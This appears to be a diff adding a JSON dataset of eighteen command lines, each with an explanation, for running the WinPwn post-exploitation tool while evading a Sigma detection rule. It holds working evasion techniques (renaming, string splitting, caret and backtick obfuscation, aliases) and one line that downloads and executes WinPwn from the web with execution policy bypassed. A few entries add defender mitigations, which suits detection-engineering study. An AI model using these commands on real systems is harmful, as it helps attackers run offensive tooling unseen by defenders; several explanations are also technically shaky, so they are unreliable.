@@ -1,0 +1,74 @@
+[
+  {
+    "output": "C:\\Windows\\System32\\cmd.exe /c start \"\" \"C:\\Users\\Public\\WP.exe\"",
+    "explanation": "The command launches a renamed version of the WinPwn executable (WP.exe) that does not contain any of the detection strings ('Offline_Winpwn', 'WinPwn ', 'WinPwn.exe', 'WinPwn.ps1'), thus bypassing the sigma rule while still executing the tool."
+  },
+  {
+    "output": "C:\\Windows\\System32\\cmd.exe /c Start C:\\Temp\\WinPwn_Tool.exe -recon",
+    "explanation": "Renaming the executable to 'WinPwn_Tool.exe' and using a different argument ('-recon') avoids the exact keywords 'WinPwn', 'WinPwn.exe', or 'WinPwn.ps1' in the command line, bypassing the rule."
+  },
+  {
+    "output": "Copy-Item .\\WinPwn.ps1 .\\NotMalware.ps1; .\\NotMalware.ps1 -noninteractive",
+    "explanation": "The rule specifically looks for the string 'WinPwn.ps1'. By renaming the script to 'NotMalware.ps1' before execution, the command line log will not contain the forbidden string, effectively bypassing the 'CommandLine|contains' selection."
+  },
+  {
+    "output": "iex (Get-Content .\\WinPwn.ps1 -Raw)",
+    "explanation": "Using 'Invoke-Expression' (iex) to read the content of the script directly into memory avoids passing the filename 'WinPwn.ps1' as a command-line argument, which is what the Sigma rule is monitoring."
+  },
+  {
+    "output": "$w = 'Win'; $p = 'Pwn'; invoke-expression \"& ${w}${p}.exe --gadgets\"",
+    "explanation": "This uses string concatenation to build the executable name. Since the SIEM rule looks for the literal string 'WinPwn.exe', breaking it into variables and joining them at runtime prevents the static string matcher from triggering."
+  },
+  {
+    "output": "set-alias wp .\\WinPwn.exe; wp -poweradv",
+    "explanation": "Creating a PowerShell alias for the executable allows the user to run the tool using a shorthand (wp) that does not match any of the patterns defined in the Sigma detection selection."
+  },
+  {
+    "output": "powershell.exe -c \"$tool = 'Win' + 'Pwn.ps1'; Invoke-Expression -Command .\\$tool\"",
+    "explanation": "This bypasses the rule by splitting the targeted keyword 'WinPwn.ps1' into separate strings. The Sigma rule relies on an exact contiguous string match, which is no longer present in the logged command line arguments."
+  },
+  {
+    "output": "cmd.exe /c \"W^i^n^P^w^n^.e^x^e\"",
+    "explanation": "This technique uses cmd.exe caret (^) escape characters. The command line interpreter ignores the carets and executes the binary, but the literal command line string logged by Windows Event Tracing will contain the carets, successfully evading the Sigma rule's 'contains' condition."
+  },
+  {
+    "output": "C:\\Temp\\svchost_update.exe",
+    "explanation": "Because the rule specifically targets the default filename of the tool within the command line, simply renaming the 'WinPwn.exe' executable on disk before execution completely bypasses this detection logic."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\WP_Recon.ps1",
+    "explanation": "The detection rule strictly relies on exact string matches for the default tool names (e.g., 'WinPwn.ps1', 'WinPwn.exe'). By simply renaming the executable or PowerShell script before execution, the command line no longer contains the hardcoded keywords, effectively bypassing the rule."
+  },
+  {
+    "output": "powershell.exe -c \"Invoke-Expression ('W' + 'in' + 'Pwn.ps1')\"",
+    "explanation": "This bypasses the rule using string concatenation within the PowerShell command line argument. Process creation logs (like Event ID 4688 or Sysmon EID 1) will capture the literal string \"'W' + 'in' + 'Pwn.ps1'\", which prevents the SIEM from matching the contiguous string 'WinPwn'."
+  },
+  {
+    "output": "cmd.exe /c \"set a=Win && set b=Pwn.exe && call %a%%b%\"",
+    "explanation": "This technique utilizes environment variables within the Windows Command Prompt to construct the tool's name dynamically. The process creation log for cmd.exe records the variable assignment, missing the exact keyword required to trigger the Sigma rule."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1)'); W`inP`wn -noninteractive -PowerSharp\"",
+    "explanation": "The original Sigma rule looks for the literal string 'WinPwn '. By using PowerShell backticks (ticks) as escape characters within the function name (e.g., W`inP`wn), the command executes normally but fails to match the string-based detection pattern 'WinPwn '."
+  },
+  {
+    "output": "copy C:\\Tools\\WinPwn.exe C:\\Windows\\Temp\\not_malware.exe; C:\\Windows\\Temp\\not_malware.exe --fully-automated",
+    "explanation": "The rule explicitly filters for the filename 'WinPwn.exe'. By renaming the executable to a random or benign-looking name before execution, the command line utility will no longer trigger the 'WinPwn.exe' selection criteria."
+  },
+  {
+    "output": "$a='Win'; $b='Pwn'; IEX ($a+$b)",
+    "explanation": "This uses string concatenation to reconstruct the 'WinPwn' keyword at runtime. Since the Sigma rule performs a static check on the CommandLine field for specific substrings, it cannot see the resulting value formed by the variable addition."
+  },
+  {
+    "output": "powershell -ep bypass -c \"&([scriptblock]::Create('Offline_Win' + 'pwn'))\"",
+    "explanation": "By breaking the keyword 'Offline_Winpwn' into two separate strings and using the scriptblock creation method, the literal string never appears in the process creation logs, bypassing the 'contains' logic."
+  },
+  {
+    "output": "C:\\Temp\\wp_renamed.exe",
+    "explanation": "The provided Sigma rule relies entirely on literal string matching for the tool's default file name (e.g., 'WinPwn.exe' or 'WinPwn.ps1'). By simply renaming the executable or script before execution, the command line parameters will no longer contain the tracked strings. To mitigate this evasion, defenders should supplement command-line checks with rules that look at the 'OriginalFileName' PE header, file hashes (SHA256, Imphash), or behavioral patterns associated with the tool."
+  },
+  {
+    "output": "powershell.exe -Command \"$part1='Win'; $part2='Pwn.ps1'; &('.\\'+$part1+$part2)\"",
+    "explanation": "For PowerShell variants, attackers can use string concatenation to dynamically construct the script name at runtime. Since the execution engine pieces the string together in memory, the initial command line logged by Event ID 4688 or Sysmon Event ID 1 will only show the fragmented strings, effectively bypassing the exact match requirement of the Sigma rule. Defending against this requires enabling PowerShell Script Block Logging (Event ID 4104) or relying on AMSI to inspect the de-obfuscated content."
+  }
+]
